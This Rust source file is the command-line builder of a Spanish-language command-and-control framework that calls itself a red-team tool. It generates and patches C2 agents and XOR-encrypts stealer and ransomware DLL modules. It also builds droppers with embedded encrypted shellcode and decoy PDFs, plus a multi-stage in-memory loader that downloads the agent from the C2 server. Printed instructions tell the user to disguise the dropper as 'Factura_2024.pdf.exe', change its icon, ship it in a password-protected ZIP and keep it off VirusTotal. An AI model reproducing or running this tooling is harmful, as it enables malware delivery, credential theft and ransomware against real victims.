//! R2C2 es un proyecto de Command & Control para red team engagements en Linux y Windows.

mod dll_encrypt;
mod encrypt;
mod patch;
// mod pe_loader; // Disabled - using donut.exe instead
mod sc_generator;
mod stage_builder;

use clap::{Parser, Subcommand};
use dll_encrypt::{encrypt_dll, generate_random_key, xor_encrypt};
use encrypt::generate_agent;
use patch::patch_agent_binary;
use stage_builder::{build_staged_system, StageConfig};
use std::env;
use std::fs;
use std::path::PathBuf;

#[derive(Parser)]
#[command(name = "c2r2-builder")]
#[command(about = "C2R2 Agent Builder - Genera agentes, módulos y droppers", long_about = None)]
struct Args {
    #[command(subcommand)]
    command: Commands,
}

#[derive(Subcommand)]
enum Commands {
    /// Genera un agente para el C2 (requiere código fuente y Rust)
    BuildAgent {
        /// Nombre del agente generado (sin extensión .exe)
        #[arg(short, long)]
        name: String,

        /// Servidor C2 (IP:Puerto)
        #[arg(short, long, default_value = "127.0.0.1:4444")]
        server: String,

        /// Modo producción (sin consola, sin debug prints, totalmente stealthy)
        #[arg(short, long)]
        production: bool,
    },

    /// Parchea un agente pre-compilado con nueva IP/Puerto (NO requiere Rust)
    PatchAgent {
        /// Archivo agente.exe de entrada
        #[arg(short, long, default_value = "agent/agent.exe")]
        input: String,

        /// Archivo de salida
        #[arg(short, long)]
        output: String,

        /// Servidor C2 (IP:Puerto)
        #[arg(short, long)]
        server: String,
    },

    /// Encripta un módulo DLL para ser usado por el agente
    EncryptModule {
        /// Módulo a encriptar (stealer o ransomware)
        #[arg(long, default_value = "stealer")]
        module: String,
    },

    /// Genera un dropper con shellcode embebido (requiere donut + Rust)
    BuildDropper {
        /// Archivo de shellcode (.bin generado por donut)
        #[arg(short, long)]
        shellcode: PathBuf,

        /// Archivo PDF de señuelo (opcional)
        #[arg(short, long)]
        decoy: Option<PathBuf>,

        /// Nombre del dropper de salida
        #[arg(short, long, default_value = "dropper")]
        output: String,
    },

    /// Genera un dropper embediendo un agente pre-compilado (NO requiere Rust ni donut)
    /// Este es el método recomendado para distribución standalone
    GenerateDropper {
        /// Archivo agent.exe pre-compilado
        #[arg(short, long)]
        agent: PathBuf,

        /// Dropper template pre-compilado (dropper.exe base)
        #[arg(short, long, default_value = "dropper-rust/dropper.exe")]
        template: PathBuf,

        /// Archivo de salida
        #[arg(short, long)]
        output: String,

        /// Archivo PDF de señuelo (opcional, se embebe en el dropper)
        #[arg(short, long)]
        decoy: Option<PathBuf>,
    },

    /// Construye el sistema multi-stage completo (ESTER→JAVELIN→Stage0)
    /// Embebe payloads cifrados entre stages para ejecución en memoria
    BuildStaged {
        /// Servidor C2 (IP:Puerto)
        #[arg(short, long)]
        server: String,

        /// Modo producción (sin consola, sin debug prints, totalmente stealthy)
        #[arg(short, long)]
        production: bool,

        /// Directorio de salida para los binarios
        #[arg(short, long, default_value = "dist")]
        output: String,
    },
}

fn main() {
    let args = Args::parse();

    match args.command {
        Commands::BuildAgent {
            name,
            server,
            production,
        } => {
            println!("🔧 C2R2 Agent Builder v2.0");
            println!("🏷️  Agente: {}", name);
            println!("🌐 Servidor C2: {}", server);
            println!(
                "🔒 Modo: {}",
                if production {
                    "PRODUCCIÓN (stealthy)"
                } else {
                    "DESARROLLO (debug)"
                }
            );
            println!("{}", "-".repeat(50));

            match generate_agent(&name, &server, production) {
                Ok(_) => {
                    println!("✅ Agente generado exitosamente: {}.exe", name);
                }
                Err(e) => {
                    eprintln!("❌ Error: {}", e);
                    std::process::exit(1);
                }
            }
        }

        Commands::PatchAgent {
            input,
            output,
            server,
        } => {
            println!("🔧 C2R2 Agent Patcher v2.0");
            println!("📥 Input: {}", input);
            println!("📤 Output: {}", output);
            println!("🌐 Servidor C2: {}", server);
            println!("{}", "-".repeat(50));

            match patch_agent_binary(&input, &output, &server) {
                Ok(_) => {
                    println!("✅ Agente parcheado exitosamente!");
                    println!("   Puedes ejecutar {} directamente", output);
                }
                Err(e) => {
                    eprintln!("❌ Error: {}", e);
                    std::process::exit(1);
                }
            }
        }

        Commands::EncryptModule { module } => {
            println!("🔧 C2R2 Module Encryptor v2.0");
            println!("📦 Módulo: {}", module);
            println!("{}", "-".repeat(50));

            // Validar módulo
            if module != "stealer" && module != "ransomware" {
                eprintln!("❌ Error: Módulo desconocido '{}'", module);
                eprintln!("   Módulos disponibles: stealer, ransomware");
                std::process::exit(1);
            }

            // Obtener el directorio raíz del workspace (desde CARGO_MANIFEST_DIR o current_dir)
            let workspace_root = if let Ok(manifest_dir) = env::var("CARGO_MANIFEST_DIR") {
                // Ejecutado con cargo run, manifest_dir apunta a builder/
                PathBuf::from(manifest_dir).parent().unwrap().to_path_buf()
            } else {
                // Ejecutado como binario, usar current_dir y buscar Cargo.toml
                let mut current = env::current_dir().expect("No se pudo obtener current_dir");
                loop {
                    if current.join("Cargo.toml").exists() {
                        let content =
                            std::fs::read_to_string(current.join("Cargo.toml")).unwrap_or_default();
                        if content.contains("[workspace]") {
                            break;
                        }
                    }
                    if !current.pop() {
                        eprintln!("❌ Error: No se encontró el directorio raíz del workspace");
                        std::process::exit(1);
                    }
                }
                current
            };

            // Buscar DLL en target de Windows (cross-compilation desde Linux)
            let dll_path_win = workspace_root.join(format!(
                "target/x86_64-pc-windows-gnu/release/{}.dll",
                module
            ));
            let dll_path_native = workspace_root.join(format!("target/release/{}.dll", module));

            let dll_path = if dll_path_win.exists() {
                dll_path_win
            } else if dll_path_native.exists() {
                dll_path_native
            } else {
                eprintln!("❌ Error: No se encontró {}.dll", module);
                eprintln!("   Ejecuta primero:");
                eprintln!(
                    "   cargo build --release --target x86_64-pc-windows-gnu --package {}-dll",
                    module
                );
                eprintln!();
                eprintln!("   Rutas buscadas:");
                eprintln!("   - {}", dll_path_win.display());
                eprintln!("   - {}", dll_path_native.display());
                std::process::exit(1);
            };

            println!("📂 DLL encontrada: {}", dll_path.display());

            let output_enc = workspace_root.join(format!("c2r2-server/modules/{}.enc", module));
            let output_key = workspace_root.join(format!("c2r2-server/modules/{}.key", module));

            // Crear directorio modules si no existe
            if let Some(parent) = output_enc.parent() {
                if !parent.exists() {
                    if let Err(e) = std::fs::create_dir_all(parent) {
                        eprintln!("❌ Error creando directorio modules/: {}", e);
                        std::process::exit(1);
                    }
                }
            }

            // Generar clave XOR aleatoria de 32 bytes
            let xor_key = generate_random_key(32);

            println!("\n📦 Encriptando {}.dll...", module);
            match encrypt_dll(&dll_path, &output_enc, &xor_key) {
                Ok(_) => println!("✅ DLL encriptada: {}", output_enc.display()),
                Err(e) => {
                    eprintln!("❌ Error encriptando DLL: {}", e);
                    std::process::exit(1);
                }
            }

            // Guardar clave
            if let Err(e) = std::fs::write(&output_key, &xor_key) {
                eprintln!("❌ Error guardando clave: {}", e);
                std::process::exit(1);
            }
            println!(
                "🔑 Clave guardada: {} ({} bytes)",
                output_key.display(),
                xor_key.len()
            );

            println!("\n📋 Archivos generados:");
            println!("   - {}", output_enc.display());
            println!("   - {}", output_key.display());

            if module == "stealer" {
                println!("\nℹ️  Ahora puedes usar /harvest en el C2 para ejecutar el stealer");
            } else if module == "ransomware" {
                println!(
                    "\nℹ️  Ahora puedes usar /encrypt o /decrypt en el C2 para usar el ransomware"
                );
            }
        }

        Commands::BuildDropper {
            shellcode,
            decoy,
            output,
        } => {
            println!("🔧 C2R2 Dropper Builder v2.0");
            println!("📦 Shellcode: {}", shellcode.display());
            if let Some(ref d) = decoy {
                println!("📄 Decoy PDF: {}", d.display());
            }
            println!("📝 Output: {}.exe", output);
            println!("{}", "-".repeat(50));

            // Validar que el shellcode existe
            if !shellcode.exists() {
                eprintln!(
                    "❌ Error: Archivo de shellcode no encontrado: {}",
                    shellcode.display()
                );
                eprintln!("\n💡 Para generar shellcode desde agent.exe:");
                eprintln!("   1. Descarga donut: https://github.com/TheWover/donut");
                eprintln!("   2. Ejecuta: donut.exe -i agent.exe -o shellcode.bin -f 1 -a 2");
                std::process::exit(1);
            }

            // Leer shellcode
            let shellcode_data = match fs::read(&shellcode) {
                Ok(data) => data,
                Err(e) => {
                    eprintln!("❌ Error leyendo shellcode: {}", e);
                    std::process::exit(1);
                }
            };
            println!("📊 Shellcode size: {} bytes", shellcode_data.len());

            // Generar clave XOR aleatoria
            let xor_key = generate_random_key(32);
            println!("🔑 Generated XOR key: {} bytes", xor_key.len());

            // Encriptar shellcode
            let encrypted_shellcode = xor_encrypt(&shellcode_data, &xor_key);
            println!("🔐 Shellcode encrypted");

            // Obtener workspace root
            let workspace_root = get_workspace_root();

            // Generar config.rs para el dropper
            let config_path = workspace_root.join("dropper-rust/src/config.rs");

            // Copiar decoy PDF si existe
            if let Some(ref d) = decoy {
                if d.exists() {
                    // Copiar decoy a src/decoy.pdf
                    let dest = workspace_root.join("dropper-rust/src/decoy.pdf");
                    if let Err(e) = fs::copy(d, &dest) {
                        eprintln!("⚠️  No se pudo copiar decoy: {}", e);
                    } else {
                        println!("📄 Decoy PDF copiado");
                    }
                }
            }

            // Generar config.rs con shellcode embebido
            let config_content = generate_dropper_config(&xor_key, &encrypted_shellcode);

            if let Err(e) = fs::write(&config_path, &config_content) {
                eprintln!("❌ Error escribiendo config.rs: {}", e);
                std::process::exit(1);
            }
            println!("✅ Configuración generada: {}", config_path.display());

            // Compilar el dropper
            println!("\n🔨 Compilando dropper...");
            let compile_result = std::process::Command::new("cargo")
                .args(&[
                    "build",
                    "--release",
                    "--target",
                    "x86_64-pc-windows-gnu",
                    "--features",
                    "production",
                    "-p",
                    "dropper",
                ])
                .current_dir(&workspace_root)
                .output();

            match compile_result {
                Ok(result) => {
                    if result.status.success() {
                        println!("✅ Dropper compilado exitosamente");

                        // Copiar ejecutable
                        let exe_path =
                            workspace_root.join("target/x86_64-pc-windows-gnu/release/dropper.exe");
                        let dest_path = format!("{}.exe", output);

                        if let Err(e) = fs::copy(&exe_path, &dest_path) {
                            eprintln!("⚠️  No se pudo copiar ejecutable: {}", e);
                            println!("📍 El dropper está en: {}", exe_path.display());
                        } else {
                            println!("📦 Dropper guardado como: {}", dest_path);
                        }

                        println!("\n✅ ¡Dropper generado exitosamente!");
                        println!("\n📋 Próximos pasos:");
                        println!("   1. Renombrar a algo convincente: Factura_2024.pdf.exe");
                        println!("   2. Cambiar icono con Resource Hacker o similar");
                        println!("   3. Comprimir en ZIP con contraseña para distribución");
                        println!("   4. ¡NO subir a VirusTotal!");
                    } else {
                        eprintln!("❌ Error compilando dropper:");
                        eprintln!("{}", String::from_utf8_lossy(&result.stderr));
                        std::process::exit(1);
                    }
                }
                Err(e) => {
                    eprintln!("❌ Error ejecutando cargo: {}", e);
                    std::process::exit(1);
                }
            }
        }

        Commands::GenerateDropper {
            agent,
            template,
            output,
            decoy,
        } => {
            println!("🔧 C2R2 Standalone Dropper Generator v2.0");
            println!("📦 Agent: {}", agent.display());
            println!("📋 Template: {}", template.display());
            println!("📝 Output: {}.exe", output);
            if let Some(ref d) = decoy {
                println!("📄 Decoy PDF: {}", d.display());
            }
            println!("{}", "-".repeat(50));

            // Validate agent exists
            if !agent.exists() {
                eprintln!("❌ Error: Archivo agent no encontrado: {}", agent.display());
                eprintln!("\n💡 Primero genera o parchea un agent.exe:");
                eprintln!("   builder patch-agent --input agent.exe --output mi_agent.exe --server 192.168.1.100:4444");
                std::process::exit(1);
            }

            // Validate template exists
            if !template.exists() {
                eprintln!(
                    "❌ Error: Template dropper no encontrado: {}",
                    template.display()
                );
                eprintln!("\n💡 Asegúrate de tener un dropper.exe pre-compilado en dropper-rust/");
                eprintln!("   O compila uno con: cargo build --release --target x86_64-pc-windows-gnu -p dropper");
                std::process::exit(1);
            }

            // Read agent
            let agent_data = match fs::read(&agent) {
                Ok(data) => data,
                Err(e) => {
                    eprintln!("❌ Error leyendo agent: {}", e);
                    std::process::exit(1);
                }
            };
            println!("📊 Agent size: {} bytes", agent_data.len());

            // Generate XOR key
            let xor_key = generate_random_key(32);
            println!("🔑 Generated XOR key: {} bytes", xor_key.len());

            // Encrypt agent
            let encrypted_agent = xor_encrypt(&agent_data, &xor_key);
            println!("🔐 Agent encrypted: {} bytes", encrypted_agent.len());

            // Read template dropper
            let template_data = match fs::read(&template) {
                Ok(data) => data,
                Err(e) => {
                    eprintln!("❌ Error leyendo template: {}", e);
                    std::process::exit(1);
                }
            };
            println!("📋 Template size: {} bytes", template_data.len());

            // Create output dropper using sc_generator
            match sc_generator::generate_standalone_dropper(
                &template_data,
                &encrypted_agent,
                &xor_key,
                decoy.as_ref(),
            ) {
                Ok(dropper_data) => {
                    let dest_path = format!("{}.exe", output);
                    if let Err(e) = fs::write(&dest_path, &dropper_data) {
                        eprintln!("❌ Error escribiendo dropper: {}", e);
                        std::process::exit(1);
                    }

                    println!("\n✅ ¡Dropper generado exitosamente!");
                    println!("📦 Dropper guardado como: {}", dest_path);
                    println!("📊 Tamaño final: {} bytes", dropper_data.len());
                    println!("\n📋 Próximos pasos:");
                    println!("   1. Renombrar a algo convincente: Factura_2024.pdf.exe");
                    println!("   2. Cambiar icono con Resource Hacker o similar");
                    println!("   3. Comprimir en ZIP con contraseña para distribución");
                    println!("   4. ¡NO subir a VirusTotal!");
                }
                Err(e) => {
                    eprintln!("❌ Error generando dropper: {}", e);
                    std::process::exit(1);
                }
            }
        }

        Commands::BuildStaged {
            server,
            production,
            output,
        } => {
            println!("🔧 C2R2 Multi-Stage Builder v2.0");
            println!("🌐 Servidor C2: {}", server);
            println!(
                "🔒 Modo: {}",
                if production {
                    "PRODUCCIÓN (stealthy)"
                } else {
                    "DESARROLLO (debug)"
                }
            );
            println!("📂 Output: {}/", output);
            println!("{}", "-".repeat(50));

            let config = StageConfig {
                server_address: server,
                production,
                output_dir: PathBuf::from(output),
            };

            match build_staged_system(config) {
                Ok(ester_path) => {
                    println!("\n✅ ¡Sistema multi-stage generado exitosamente!");
                    println!("📦 Ejecutable final: {}", ester_path.display());
                    println!("\n📋 Para usar:");
                    println!("   1. Ejecuta {} en el sistema objetivo", ester_path.display());
                    println!("   2. ESTER validará el entorno");
                    println!("   3. Cargará JAVELIN en memoria (sin tocar disco)");
                    println!("   4. JAVELIN cargará Stage0 en memoria");
                    println!("   5. Stage0 contactará el C2 y descargará el agent completo");
                }
                Err(e) => {
                    eprintln!("❌ Error construyendo sistema multi-stage: {}", e);
                    std::process::exit(1);
                }
            }
        }
    }
}

/// Get workspace root directory
fn get_workspace_root() -> PathBuf {
    if let Ok(manifest_dir) = env::var("CARGO_MANIFEST_DIR") {
        PathBuf::from(manifest_dir).parent().unwrap().to_path_buf()
    } else {
        let mut current = env::current_dir().expect("No se pudo obtener current_dir");
        loop {
            if current.join("Cargo.toml").exists() {
                let content = fs::read_to_string(current.join("Cargo.toml")).unwrap_or_default();
                if content.contains("[workspace]") {
                    break;
                }
            }
            if !current.pop() {
                eprintln!("❌ Error: No se encontró el directorio raíz del workspace");
                std::process::exit(1);
            }
        }
        current
    }
}

/// Generate config.rs content with embedded shellcode
fn generate_dropper_config(xor_key: &[u8], encrypted_shellcode: &[u8]) -> String {
    let key_str = format_bytes_as_rust_array(xor_key);
    let shellcode_str = format_bytes_as_rust_array(encrypted_shellcode);

    format!(
        r#"//! Configuration module for the dropper
//! 
//! AUTO-GENERATED by C2R2 Builder - DO NOT EDIT MANUALLY
//! 
//! This file contains the embedded shellcode and XOR key.

// ============================================================================
// SHELLCODE CONFIGURATION
// ============================================================================

/// XOR key for decrypting the shellcode (32 bytes)
pub const XOR_KEY: &[u8] = &{};

/// XOR-encrypted shellcode ({} bytes)
pub const ENCRYPTED_SHELLCODE: &[u8] = &{};

// ============================================================================
// DECOY DOCUMENT
// ============================================================================

/// Embedded PDF decoy data
pub const DECOY_PDF_DATA: &[u8] = include_bytes!("decoy.pdf");
"#,
        key_str,
        encrypted_shellcode.len(),
        shellcode_str
    )
}

/// Format bytes as Rust array literal
fn format_bytes_as_rust_array(bytes: &[u8]) -> String {
    let hex_values: Vec<String> = bytes.iter().map(|b| format!("0x{:02x}", b)).collect();

    // Split into lines of ~16 values for readability
    let lines: Vec<String> = hex_values
        .chunks(16)
        .map(|chunk| chunk.join(", "))
        .collect();

    format!("[\n    {}\n]", lines.join(",\n    "))
}
